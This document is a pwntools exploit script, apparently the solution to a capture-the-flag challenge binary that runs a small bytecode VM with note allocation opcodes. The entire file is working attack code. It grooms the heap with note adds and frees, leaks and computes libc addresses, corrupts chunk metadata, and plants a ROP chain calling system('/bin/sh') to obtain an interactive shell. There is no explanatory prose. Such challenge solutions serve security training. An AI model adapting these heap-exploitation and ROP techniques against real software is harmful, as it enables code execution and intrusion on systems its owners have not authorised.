#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path) if exe.libc else None

def start(argv=[], *a, **kw):
    if args.GDB: return gdb.debug([exe.path]+argv, gdbscript=gdbscript, *a, **kw)
    else: return process([exe.path]+argv, *a, **kw)

RESTART, RESTART_DUP, SET, ADD, MUL, DIV, MOV, XCHG, ADD_NOTE, DEL_NOTE, NOP = range(11)
def ins(opcode, operand = 0):
    return p8(opcode) +\
     (operand.to_bytes(16, 'little') if type(operand) == type(int()) else operand.ljust(16, b'\x00'))

def xor(n=128, c=True):
  b  = b''
  b += ins(SET, 1<<127) + ins(MOV, 14)
  b += ins(SET, 0x0) + ins(MOV, 3)
  b += ins(RESTART)
  io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

  for i in range(n):
    b  = b''
    b += ins(SET, 1<<i) + ins(MOV, 13)
    b += ins(SET, 0) + ins(ADD, 1)
    b += ins(DIV, 13)
    b += ins(MUL, 14) + ins(DIV, 14)
    b += ins(MOV, 12)
    b += ins(SET, 0) + ins(ADD, 2)
    b += ins(DIV, 13)
    b += ins(MUL, 14) + ins(DIV, 14)
    b += ins(ADD, 12)
    b += ins(MUL, 14) + ins(DIV, 14)
    b += ins(MUL, 13) + ins(ADD, 3)
    b += ins(MOV, 3)

    for j in range(0, len(b), 13*17):
      c = b[j:j+13*17] + ins(RESTART)
      io.sendafter(b':', c+(b'\n' if len(c) < 0xf9 else b''))

  if not c: return
  if n < 64:
    b  = b''
    b += ins(SET, 1<<n) + ins(MOV, 14)
    b += ins(SET, 0) + ins(ADD, 1)
    b += ins(DIV, 14) + ins(MUL, 14)
    b += ins(ADD, 3) + ins(MOV, 3)
    b += ins(RESTART)
    io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

gdbscript = \
f'''
init-pwndbg
c
'''

io = start()

b  = b''
for i in range(7): b += ins(ADD_NOTE, i)
for i in range(7):
  if i != 1: b += ins(DEL_NOTE, i)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(DEL_NOTE, 1)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
for i in range(6, -1, -1): b += ins(ADD_NOTE, i)
for i in range(3): b += ins(ADD_NOTE, 7+i)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
for i in range(7): b += ins(DEL_NOTE, 3+i)
b += ins(DEL_NOTE, 2)
b += ins(DEL_NOTE, 0)
b += ins(ADD_NOTE, 0)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))
io.sendafter(b':', ins(RESTART).ljust(0xf8, b'\x00')+p8(1|(1<<1)))

b  = b''
for i in range(5, -1, -1): b += ins(ADD_NOTE, 2+i)
b += ins(RESTART_DUP)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))
io.sendlineafter(b':', p8(SET))

b  = b''
b += ins(DEL_NOTE, 0)
b += ins(ADD_NOTE, 8)
b += ins(ADD_NOTE, 0)
b += ins(ADD_NOTE, 9)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(MOV, 1) + ins(SET, 1<<8) + ins(MUL, 1)
b += ins(MOV, 1)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(SET, 1<<64) + ins(MOV, 14)
b += ins(SET, 1<<12) + ins(MOV, 13)
b += ins(SET, -(libc.sym.main_arena+320)%(1<<64)) + ins(MOV, 12)
b += ins(SET, 0) + ins(ADD, 1)
b += ins(DIV, 14) + ins(DIV, 13) + ins(MUL, 13)
b += ins(MOV, 4)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(SET, 0) + ins(ADD, 1)
b += ins(MUL, 14) + ins(DIV, 14)
b += ins(ADD, 12) + ins(MUL, 14) + ins(DIV, 14)
b += ins(MOV, 5)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(SET, 1<<12) + ins(MOV, 14)
b += ins(SET, libc.sym.__libc_argv) + ins(ADD, 5) + ins(MOV, 1)
b += ins(DIV, 14) + ins(MOV, 11)
b += ins(SET, 0) + ins(ADD, 4) + ins(DIV, 14) + ins(MOV, 2)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

xor(8*6-12)

b  = b''
b += ins(SET, (0x390|1)<<64) + ins(MOV, 6)
b += ins(SET, 1<<64) + ins(MOV, 14)
b += ins(SET, 0) + ins(ADD, 4) + ins(MUL, 14) + ins(ADD, 4) + ins(MOV, 7)
b += ins(SET, 0x370+(0x370<<64)) + ins(ADD, 7) + ins(MOV, 7)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(DEL_NOTE, 0)
b += ins(ADD_NOTE, 0)
for i in range(6): b += ins(DEL_NOTE, 3+i)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(DEL_NOTE, 9)
b += ins(DEL_NOTE, 2)
for i in range(9, 2, -1): b += ins(ADD_NOTE, i)
b += ins(RESTART)
io.sendafter(b':', b.ljust(0xf0, b'\x00')+p64(0x390)+p8(0))

b  = b''
b += ins(SET, (0x100|1)<<64) + ins(MOV, 8)
b += ins(ADD_NOTE, 11)
b += ins(ADD_NOTE, 12)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(SET, 0)*11
b += ins(ADD_NOTE, 2)
b += ins(ADD_NOTE, 15)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(SET, 0) + ins(ADD, 3)
b += ins(MOV, 9)
b += ins(DEL_NOTE, 1)
b += ins(DEL_NOTE, 11)
b += ins(ADD_NOTE, 11)
b += ins(ADD_NOTE, 13)
b += ins(ADD_NOTE, 14)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(DEL_NOTE, 15)
b += ins(SET, 0)*5
b += p8(SET)+p8(0)+p16(0x100|1)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(MOV, 1)
b += ins(SET, 1<<(8*9)) + ins(MOV, 14)
b += ins(SET, 0) + ins(ADD, 1) + ins(DIV, 14) + ins(MOV, 1)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(SET, 0) + ins(ADD, 11) + ins(MOV, 3)
b += ins(SET, 0) + ins(ADD, 2) + ins(MOV, 11)
b += ins(SET, 0) + ins(ADD, 3) + ins(MOV, 2)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

xor(8*6-12)

b  = b''
b += ins(SET, 0) + ins(ADD, 3) + ins(MOV, 1)
b += ins(SET, 0) + ins(ADD, 11) + ins(MOV, 2)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

xor(2*8, False)

b  = b''
b += ins(SET, 2**(8*14)) + ins(MOV, 14)
b += ins(SET, (-0x148)%(1<<16)) + ins(ADD, 3)
b += ins(MUL, 14) + ins(DIV, 14) + ins(MOV, 3)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(SET, 2**16) + ins(MOV, 14)
b += ins(SET, 0) + ins(ADD, 1) + ins(DIV, 14) + ins(MUL, 14) + ins(MOV, 11)
b += ins(SET, 0) + ins(ADD, 3) + ins(MOV, 1)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

xor(2*8, False)

b  = b''
b += ins(SET, 0) + ins(ADD, 11)
b += ins(ADD, 3) + ins(MOV, 9)
b += ins(DEL_NOTE, 13)
b += ins(DEL_NOTE, 11)
b += ins(ADD_NOTE, 11)
b += ins(RESTART)
io.sendafter(b':', b+(b'\n' if len(b) < 0xf9 else b''))

'''
0x0012133c: pop rdi; ret;
0x0018815d: ret;
'''
rop = [0x18815d, 0x12133c, next(libc.search(b'/bin/sh\x00')), libc.sym.system]

b  = b''
b += ins(SET, 1<<64) + ins(MOV, 14)
b += ins(SET, 0) + ins(ADD, 5)
b += ins(MUL, 14) + ins(ADD, 5) + ins(MOV, 1)
b += ins(SET, rop[1] | (rop[2] << 64))
b += ins(ADD, 1) + ins(MOV, 1)
b += ins(SET, rop[3]) + ins(ADD, 5) + ins(MOV, 2)
b += ins(RESTART)
io.sendafter(b':', b + (b'\n' if len(b) < 0xf9 else b''))

b  = b''
b += ins(SET, rop[0]) + ins(ADD, 5) + ins(MUL, 14)
b += ins(ADD_NOTE, 1) + ins(ADD_NOTE, 13)
b += ins(RESTART)
io.sendafter(b':', b + (b'\n' if len(b) < 0xf9 else b''))

io.interactive()
